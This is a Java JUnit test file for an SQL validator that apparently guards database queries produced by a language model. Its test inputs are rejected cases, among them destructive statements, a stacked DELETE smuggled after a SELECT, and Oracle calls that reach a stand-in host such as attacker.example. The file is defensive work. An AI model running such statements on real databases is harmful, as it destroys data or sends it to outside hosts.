package com.org.llm.guard;

import com.org.llm.exception.SqlValidationException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

class SqlGuardTest {

    private final SqlGuard guard = new SqlGuard();

    @Test
    @DisplayName("Plain SELECT statement passes through unchanged")
    void acceptsPlainSelect() {
        assertEquals("SELECT * FROM orders FETCH FIRST 10 ROWS ONLY",
                guard.validate("SELECT * FROM orders FETCH FIRST 10 ROWS ONLY"));
    }

    @Test
    @DisplayName("WITH clause (CTE) statement passes through unchanged")
    void acceptsWithClause() {
        String sql = "WITH t AS (SELECT customer_id FROM orders) SELECT * FROM t";
        assertEquals(sql, guard.validate(sql));
    }

    @Test
    @DisplayName("Block and line comments plus trailing semicolon are stripped")
    void stripsCommentsAndTrailingSemicolon() {
        String cleaned = guard.validate("SELECT 1 FROM dual /* block */ -- line\n;");
        assertEquals("SELECT 1 FROM dual", cleaned.strip().replaceAll("\\s+", " "));
    }

    @ParameterizedTest
    @DisplayName("Non-SELECT statements (DML, DDL, PL/SQL, multi-statement) are rejected")
    @ValueSource(strings = {
            "DELETE FROM orders",
            "INSERT INTO orders VALUES (1)",
            "UPDATE orders SET status = 'X'",
            "DROP TABLE orders",
            "TRUNCATE TABLE orders",
            "BEGIN NULL; END;",
            "GRANT SELECT ON orders TO PUBLIC",
            "SELECT * FROM orders; DELETE FROM orders"
    })
    void rejectsNonSelectStatements(String sql) {
        assertThrows(SqlValidationException.class, () -> guard.validate(sql));
    }

    @Test
    @DisplayName("Forbidden keyword smuggled inside an otherwise-valid SELECT is rejected")
    void rejectsForbiddenKeywordSmuggledInsideSelect() {
        assertThrows(SqlValidationException.class,
                () -> guard.validate("SELECT UTL_HTTP.REQUEST('http://evil') FROM dual"));
    }

    @Test
    @DisplayName("Blank SQL is rejected")
    void rejectsEmptySql() {
        assertThrows(SqlValidationException.class, () -> guard.validate("  "));
    }

    @ParameterizedTest
    @DisplayName("Built-in packages and URI types that reach the network, file system or run jobs are rejected")
    @ValueSource(strings = {
            "SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.example') FROM dual",
            "SELECT HTTPURITYPE('http://attacker.example/').GETCLOB() FROM dual",
            "SELECT DBMS_LDAP.INIT('attacker.example', 389) FROM dual",
            "SELECT DBMS_PIPE.RECEIVE_MESSAGE('p', 10) FROM dual",
            "SELECT sys.DBMS_SQL.OPEN_CURSOR FROM dual",
            "SELECT DBURITYPE('/SYS/DUAL').GETCLOB() FROM dual"
    })
    void rejectsSideEffectPackages(String sql) {
        assertThrows(SqlValidationException.class, () -> guard.validate(sql));
    }

    @ParameterizedTest
    @DisplayName("Read-only helper packages and look-alike identifiers are still allowed")
    @ValueSource(strings = {
            "SELECT DBMS_LOB.SUBSTR(notes, 100, 1) AS notes FROM customers",
            "SELECT * FROM products ORDER BY DBMS_RANDOM.VALUE FETCH FIRST 5 ROWS ONLY",
            "SELECT created_at, updated_by FROM orders"
    })
    void acceptsReadOnlyPackagesAndLookalikes(String sql) {
        assertEquals(sql, guard.validate(sql));
    }
}
